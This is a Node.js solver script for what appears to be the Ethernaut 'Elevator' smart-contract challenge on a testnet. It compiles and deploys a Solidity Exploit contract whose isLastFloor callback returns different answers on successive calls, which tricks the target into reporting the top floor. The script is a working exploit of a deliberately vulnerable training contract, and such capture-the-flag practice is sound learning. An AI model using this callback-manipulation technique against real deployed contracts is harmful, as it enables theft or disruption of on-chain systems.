const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');
const solc = require('solc');

const contractAbi = [{"inputs":[],"name":"floor","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x40695363"},{"inputs":[{"internalType":"uint256","name":"_floor","type":"uint256"}],"name":"goTo","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0xed9a7134"},{"inputs":[],"name":"top","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xfe6dcdba"}];

const exploitCode = `
    pragma solidity 0.8.19;

    interface IElevator {
        function goTo(uint _floor) external;
    }

    contract Exploit {
        bool public alreadyCalled;

        function exploit(address _target) public {
            alreadyCalled = false;
            uint256 floor;
            unchecked {
                floor = uint256(0) - 1;
            }
            IElevator(_target).goTo(floor);
        }

        function isLastFloor(uint) public returns (bool) {
            if (alreadyCalled) {
                return true;
            }

            alreadyCalled = true;
            return false;
        }
    }
`;

const input = {
    language: 'Solidity',
    sources: {
        'Exploit.sol': {
            content: exploitCode,
        },
    },
    settings: {
        outputSelection: {
            '*': {
                '*': ['*'],
            },
        },
    },
};

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new ethers.Contract(contractAddress, contractAbi, provider);
    const account = new ethers.Wallet(privateKey, provider);

    if (await isSolved(contract)) {
        console.log('contract already pwned');
        process.exit(0);
    }

    console.log('compiling exploit contract...');
    const compiler = await (new Promise((resolve, reject) => {
        solc.loadRemoteVersion('v0.8.19+commit.7dd6d404', (err, solc) => {
            if (err) {
                reject(err);
                return;
            }
            resolve(solc);
        });
    }));
    const compilerOutput = JSON.parse(compiler.compile(JSON.stringify(input)));
    const exploitAbi = compilerOutput.contracts['Exploit.sol'].Exploit.abi;
    const exploitBytecode = compilerOutput.contracts['Exploit.sol'].Exploit.evm.bytecode.object;

    console.log('deploying exploit contract...');

    const factory = new ethers.ContractFactory(exploitAbi, exploitBytecode, account);
    const exploitInstance = await factory.deploy();
    const exploitAddress = await exploitInstance.getAddress();
    console.log('exploit contract deployed at:', exploitAddress);

    console.log('calling exploit function...');
    const exploitTx = await exploitInstance.exploit(contractAddress);
    await exploitTx.wait();

    console.log('floor:', await contract.floor());

    console.log('checking if we reached to top of the building...');
    if (await isSolved(contract)) {
        console.log('solved!');
    } else {
        console.error('failed to exploit contract');
        process.exit(1);
    }
}

async function isSolved(contract) {
    return (await contract.top());
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as the first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as the second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
